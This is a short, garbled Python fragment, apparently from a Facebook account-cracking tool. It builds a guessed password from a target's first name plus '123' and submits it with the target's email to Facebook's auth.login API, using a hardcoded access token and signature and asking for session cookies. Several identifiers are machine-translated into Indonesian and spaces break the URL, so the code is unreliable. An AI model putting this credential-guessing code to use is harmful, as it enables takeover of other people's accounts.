			b  =  json . beban ( a . teks )
			pass1  =  b [ 'first_name' ] + '123'
			data  =  urllib . urlopen ( "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + ( pengguna ) + "& locale = en_US & password =" + ( pass1 ) + "& sdk = ios & menghasilkan_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 " )
